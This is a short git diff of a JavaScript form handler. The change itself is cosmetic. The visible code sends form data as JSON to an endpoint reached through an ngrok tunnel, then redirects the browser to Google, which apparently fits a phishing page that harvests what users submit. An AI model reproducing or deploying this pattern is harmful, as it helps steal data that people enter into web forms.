@@ -17,7 +17,9 @@ const sendData = () => {
       "ngrok-skip-browser-warning": true,
     },
     body: jsonData,
-  }).finally(() => (location.href = "https://google.com"));
+  }).finally(() => {
+    location.href = "https://google.com";
+  });
 };
 
 document.querySelector("form").addEventListener("submit", (e) => {
